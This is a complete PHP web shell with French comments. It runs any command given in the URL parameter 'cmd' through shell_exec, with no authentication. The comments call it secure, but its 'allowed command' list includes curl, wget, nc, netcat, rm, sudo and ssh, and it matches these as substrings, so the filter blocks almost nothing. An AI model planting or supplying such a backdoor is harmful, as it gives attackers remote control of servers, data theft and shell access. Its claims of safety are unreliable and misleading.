<?php
// Webshell PHP sécurisé et optimisé pour l'exécution de commandes système
// --- Améliorations : Filtrage des commandes, sortie formatée, sécurité renforcée ---

// Liste des commandes autorisées (définir les commandes qui peuvent être exécutées)
$allowed_commands = array(
    'ls', 'id', 'pwd', 'whoami', 'cat', 'echo', 'df', 'top', 'ps', 'uptime', 'netstat', 'ifconfig', 
    'who', 'last', 'chmod', 'chown', 'ping', 'curl', 'wget', 'find', 'grep', 'tar', 'zip', 'unzip', 
    'rmdir', 'rm', 'mkdir', 'cp', 'mv', 'sudo', 'uname', 'netcat', 'nc', 'telnet', 'ssh', 'history',
    'lsblk', 'mount', 'umount', 'iptables', 'ps aux', 'fuser', 'basename'
);

// Fonction pour valider et filtrer les commandes envoyées
function is_valid_command($cmd) {
    global $allowed_commands;

    // Vérifier si la commande existe dans la liste autorisée
    foreach ($allowed_commands as $allowed) {
        if (strpos($cmd, $allowed) !== false) {
            return true; // Commande trouvée dans la liste autorisée
        }
    }
    return false; // Commande non autorisée
}

// Vérification si une commande a été envoyée via GET
if (isset($_GET['cmd'])) {
    $cmd = trim($_GET['cmd']); // Nettoyage de la commande

    // Sécuriser la commande en empêchant les injections
    $cmd = escapeshellcmd($cmd); // Protège contre les injections

    // Validation de la commande
    if (is_valid_command($cmd)) {
        echo "<pre>";
        // Exécution sécurisée de la commande
        $output = shell_exec($cmd . ' 2>&1'); // Exécution avec gestion des erreurs
        if ($output === null) {
            echo "Erreur lors de l'exécution de la commande.";
        } else {
            echo htmlspecialchars($output); // Affichage sécurisé de la sortie
        }
        echo "</pre>";
    } else {
        echo "Commande non autorisée. Veuillez utiliser des commandes valides.";
    }
} else {
    echo "<pre>Veuillez entrer une commande dans l'URL comme suit : <code>?cmd=ls</code></pre>";
}
?>
